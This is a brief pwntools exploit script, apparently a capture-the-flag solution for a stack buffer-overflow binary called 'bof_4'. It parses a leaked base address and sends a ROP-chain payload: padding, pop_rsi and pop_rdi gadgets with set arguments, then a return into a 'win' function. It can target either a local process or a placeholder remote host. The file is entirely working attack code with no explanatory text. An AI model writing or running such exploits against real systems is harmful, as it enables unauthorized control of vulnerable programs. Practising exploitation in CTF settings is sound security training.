#!/usr/bin/env python3
from pwn import *

exe_path = './bof_4'

HOST = 'example.com/ip'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe

gdbscript = '''
# Break tại main hoặc địa chỉ cụ thể
break *main
# break *win
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        p = process(exe.path)
        return p
    return process(exe.path)

p = start()

a1 = a2 = 0xdeadbeefdeadbeef
p.recvuntil(b'Opps! ')
leak_str = p.recvline().strip()
base = int(leak_str, 16)
log.success(f"base addr: {hex(base)}")

pop_rsi = 0x0000000000001201 + base
pop_rdi = 0x00000000000011f8 + base
win_addr = 0x1206 + base

log.success(f"base address: {hex(base)}")

payload = 0x68*b'A' + p64(pop_rsi) + p64(a1) + p64(pop_rdi) + p64(a2) + p64(win_addr+5) + (256 - 0x68 - 8*5)*b'\x00'

p.sendafter(b'Enter your favorite number: ', payload)

p.interactive()
